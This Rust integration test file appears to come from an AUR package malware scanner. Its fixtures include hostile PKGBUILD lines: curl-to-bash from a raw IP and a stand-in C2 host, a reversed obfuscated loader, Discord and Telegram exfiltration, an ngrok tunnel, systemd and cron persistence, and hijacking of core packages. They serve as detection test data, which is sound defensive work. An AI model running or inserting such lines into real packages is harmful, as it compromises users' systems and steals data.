use aur_sentry::analyzer::{inspect_tar_stream, shannon_entropy};
use aur_sentry::report::{Advisory, load_advisories, save_advisories, update_readme_table};
use aur_sentry::scanner::{Finding, PKGBUILDScanner};
use flate2::Compression;
use flate2::write::GzEncoder;
use std::io::Write;

fn make_test_tar(files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut tar_bytes = Vec::new();
    for &(filename, content) in files {
        let mut header = [0u8; 512];
        let name_bytes = filename.as_bytes();
        header[..name_bytes.len().min(100)]
            .copy_from_slice(&name_bytes[..name_bytes.len().min(100)]);
        header[100..108].copy_from_slice(b"0000755\0");
        let size_octal = format!("{:011o}\0", content.len());
        header[124..136].copy_from_slice(size_octal.as_bytes());
        header[156] = b'0';

        let mut chk: u32 = 8 * b' ' as u32;
        for &b in &header[..148] {
            chk += b as u32;
        }
        for &b in &header[156..512] {
            chk += b as u32;
        }
        let chk_str = format!("{:06o}\0 ", chk);
        header[148..156].copy_from_slice(chk_str.as_bytes());

        tar_bytes.extend_from_slice(&header);
        tar_bytes.extend_from_slice(content);
        let pad = (512 - (content.len() % 512)) % 512;
        tar_bytes.resize(tar_bytes.len() + pad, 0);
    }
    tar_bytes.resize(tar_bytes.len() + 1024, 0);

    let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
    encoder.write_all(&tar_bytes).unwrap();
    encoder.finish().unwrap()
}

#[test]
fn integration_full_attack_vectors_suite() {
    let scanner = PKGBUILDScanner::new();

    // 1. Curl pipe bash execution
    let pkg1 = r#"
pkgname=malicious-curl-pipe
pkgver=1.0.0
build() {
    curl -s http://194.26.29.112/loader.sh | bash
}
"#;
    let findings = scanner.scan(pkg1, Some("malicious-curl-pipe"));
    assert!(
        findings
            .iter()
            .any(|f| f.rule_id == "EXFIL_CURL_PIPE_EXEC" || f.rule_id == "EXFIL_RAW_IP")
    );

    // 2. Discord Webhook exfiltration
    let pkg2 = r#"
pkgname=exfil-discord
pkgver=1.0.0
package() {
    curl -X POST -H "Content-Type: application/json" -d '{"content":"stolen"}' https://discord.com/api/webhooks/12345/abcdef
}
"#;
    let findings = scanner.scan(pkg2, Some("exfil-discord"));
    assert!(
        findings
            .iter()
            .any(|f| f.rule_id == "EXFIL_DISCORD_WEBHOOK")
    );

    // 3. Reverse tunnel (ngrok / serveo)
    let pkg3 = r#"
pkgname=c2-tunnel
pkgver=1.0.0
prepare() {
    ./ngrok tcp 22 --domain evil.tunnelmole.net
}
"#;
    let findings = scanner.scan(pkg3, Some("c2-tunnel"));
    assert!(
        findings
            .iter()
            .any(|f| f.rule_id == "THREAT_INTEL_TUNNEL_PROXY")
    );

    // 4. Reverse string + eval obfuscation
    let pkg4 = r#"
pkgname=rev-eval
pkgver=1.0.0
build() {
    echo 'hsab | hs.daolyap/moc.evil//:ptth lruc' | rev | bash
}
"#;
    let findings = scanner.scan(pkg4, Some("rev-eval"));
    assert!(findings.iter().any(|f| f.rule_id == "OBFUSCATED_REV_PIPE"));

    // 5. Systemd backdoor persistence
    let pkg5 = r#"
pkgname=systemd-persist
pkgver=1.0.0
package() {
    install -Dm644 backdoor.service /etc/systemd/system/backdoor.service
}
"#;
    let findings = scanner.scan(pkg5, Some("systemd-persist"));
    assert!(findings.iter().any(|f| f.rule_id == "PERSIST_SYSTEMD"));

    // 6. Telegram bot C2
    let pkg6 = r#"
pkgname=telegram-bot-c2
pkgver=1.0.0
prepare() {
    curl -s "https://api.telegram.org/bot987654:ABCdefGHI/sendMessage?chat_id=1&text=infected"
}
"#;
    let findings = scanner.scan(pkg6, Some("telegram-bot-c2"));
    assert!(findings.iter().any(|f| f.rule_id == "EXFIL_TELEGRAM_BOT"));

    // 7. Core package hijacking (replaces archlinux-keyring)
    let pkg7 = r#"
pkgname=fake-keyring
pkgver=1.0.0
replaces=('archlinux-keyring' 'pacman')
"#;
    let findings = scanner.scan(pkg7, Some("fake-keyring"));
    assert!(findings.iter().any(|f| f.rule_id == "PKG_REPLACE_CORE"));

    // 8. Cron persistence
    let pkg8 = r#"
pkgname=cron-persist
pkgver=1.0.0
build() {
    echo "* * * * * /tmp/miner" | crontab -
}
"#;
    let findings = scanner.scan(pkg8, Some("cron-persist"));
    assert!(findings.iter().any(|f| f.rule_id == "PERSIST_CRON"));
}

#[test]
fn integration_benign_complex_pkgbuild_zero_false_positives() {
    let scanner = PKGBUILDScanner::new();

    // Standard complex PKGBUILD with hashes, git source, arrays, chrome-sandbox SUID
    let pkg = r#"
# Maintainer: Arch User <user@archlinux.org>
pkgname=google-chrome
pkgver=124.0.6367.60
pkgrel=1
pkgdesc="The popular web browser by Google"
arch=('x86_64')
url="https://www.google.com/chrome/"
license=('custom:chrome')
depends=('alsa-lib' 'gtk3' 'nss' 'libxss')
optdepends=('pipewire: WebRTC desktop sharing')
source=("https://dl.google.com/linux/chrome/deb/pool/main/g/google-chrome-stable/google-chrome-stable_${pkgver}-1_amd64.deb")
sha256sums=('4b37344f6f7aa5394fb0e1ea7a6c9cf1c260be562f790c5fae46127bcfeb523a')

package() {
    bsdtar -xf data.tar.xz -C "${pkgdir}"
    chmod 4755 "${pkgdir}/opt/google/chrome/chrome-sandbox"
}
"#;
    let findings = scanner.scan(pkg, Some("google-chrome"));
    let actionable: Vec<_> = findings
        .into_iter()
        .filter(|f| f.severity != "INFO" && f.severity != "LOW")
        .collect();
    assert!(
        actionable.is_empty(),
        "Expected zero actionable findings on benign chrome PKGBUILD, got: {actionable:?}"
    );
}

#[test]
fn integration_tar_archive_deep_inspector() {
    let dummy_c = b"#include <stdio.h>\nint main() { printf(\"hello\\n\"); return 0; }\n";
    let miner_bin = b"xmrig mining logic fake binary stream";

    let mut upx_bin = vec![0x7f, b'E', b'L', b'F'];
    upx_bin.extend(b"UPX!packed_segment");

    let tar_gz = make_test_tar(&[
        ("src/main.c", dummy_c),
        ("bin/xmrig", miner_bin),
        ("bin/hidden_daemon", &upx_bin),
        (
            "share/assets/payload.sh",
            b"#!/bin/bash\ncurl http://c2.evil | bash\n",
        ),
    ]);

    let findings = inspect_tar_stream(&tar_gz);
    assert!(findings.iter().any(|f| f.rule_id == "ARCHIVE_MINER_BINARY"));
    assert!(
        findings
            .iter()
            .any(|f| f.rule_id == "ARCHIVE_UPX_PACKED_ELF")
    );
    assert!(
        findings
            .iter()
            .any(|f| f.rule_id == "ARCHIVE_SUSPICIOUS_SCRIPT_LOCATION")
    );
}

#[test]
fn integration_shannon_entropy_boundary_testing() {
    // 1. Natural English code string
    let code = "function calculate_sum(a, b) { return a + b; }";
    let h_code = shannon_entropy(code);
    assert!(
        h_code < 4.5,
        "Natural code should have low entropy: {h_code}"
    );

    // 2. Hex checksum (64 chars) should be high but is whitelisted in analyzer
    let hex_hash = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855";
    let h_hex = shannon_entropy(hex_hash);
    assert!(h_hex < 4.5, "Hex hash entropy: {h_hex}");

    // 3. Encrypted/packed base64 payload
    let encrypted = "y7VvN91xK+J82zL0mP4wQ6rT3uS5aD1fG2hJ4kL6nB8=";
    let h_enc = shannon_entropy(encrypted);
    assert!(
        h_enc > 5.0,
        "Encrypted payload should have high entropy: {h_enc}"
    );
}

#[test]
fn integration_report_generation_and_readme_pipeline() {
    let temp_dir = std::env::temp_dir().join(format!("aur_sentry_e2e_{}", std::process::id()));
    let _ = std::fs::create_dir_all(&temp_dir);

    let initial_readme = r#"# AUR Sentry
Autonomous supply chain watchdog.

<!-- AUTOPILOT_TABLE_START -->
<!-- AUTOPILOT_TABLE_END -->

License: MIT
"#;
    std::fs::write(temp_dir.join("README.md"), initial_readme).unwrap();

    let advisories = vec![Advisory {
        package: "compromised-driver".into(),
        version: "2.4.1-1".into(),
        maintainer: "hacked_user".into(),
        highest_severity: "CRITICAL".into(),
        detected_at: "2026-03-24T15:30:00Z".into(),
        findings: vec![Finding {
            rule_id: "EXFIL_DISCORD_WEBHOOK".into(),
            severity: "CRITICAL".into(),
            description: "Discord webhook token grabber".into(),
            line_number: 14,
            matched_text: "discord.com/api/webhooks".into(),
        }],
        aur_url: "https://aur.archlinux.org/packages/compromised-driver".into(),
    }];

    save_advisories(&temp_dir, &advisories);
    let loaded = load_advisories(&temp_dir);
    assert_eq!(loaded.len(), 1);
    assert_eq!(loaded[0].package, "compromised-driver");

    update_readme_table(&temp_dir, &loaded);

    let readme = std::fs::read_to_string(temp_dir.join("README.md")).unwrap();
    assert!(readme.contains("<details open>"));
    assert!(readme.contains("<summary>Active Threats (1)</summary>"));
    assert!(readme.contains("`[CRITICAL]`"));
    assert!(readme.contains("`compromised-driver`"));
    assert!(readme.contains("License: MIT"));

    let _ = std::fs::remove_dir_all(&temp_dir);
}
